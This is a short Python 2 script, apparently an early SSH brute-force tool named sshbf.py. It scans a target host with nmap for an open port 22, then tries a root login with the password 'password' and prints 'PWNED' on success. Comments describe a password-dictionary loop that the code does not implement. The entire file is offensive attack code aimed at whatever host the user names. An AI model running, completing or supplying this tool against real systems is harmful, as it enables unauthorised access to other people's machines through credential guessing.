#!/usr/bin/python
import nmap
import argparse 
from pexpect import pxssh

def checkSSHOpen(tgtHost):
    print "Checking if SSH Port is open for "+tgtHost
    nmScan = nmap.PortScanner()
    nmScan.scan(tgtHost, '22')
    state = nmScan[tgtHost]['tcp'][22]['state']
    return state

def attackSSH(tgtHost):
    print "Attacking SSH"
    # get ip address and use root account to login
    try:
        s = pxssh.pxssh()
        s.login(tgtHost, 'root', 'password')
        print 'PWNED'
        s.logout()    
    # run through password dictionary and if found,
    except pxssh.ExceptionPxssh as e:
    # return username and password combo in a object
        print("login combo does not work")
        print(e)

def main():
    parser = argparse.ArgumentParser(description='usage: ./sshbf.py'+\
    '-H <target host>')
    parser.add_argument('-H', dest='tgtHost', help='specify target host')
    args = parser.parse_args()
    tgtHost = args.tgtHost

    if (tgtHost == None):
        print parser.description
        exit(0)
    
    if (checkSSHOpen(tgtHost) == 'open'):
        print 'SSH port open'
        attackSSH(tgtHost)
    else:
        print 'SSH port closed'
    
if __name__ == '__main__':
    main()
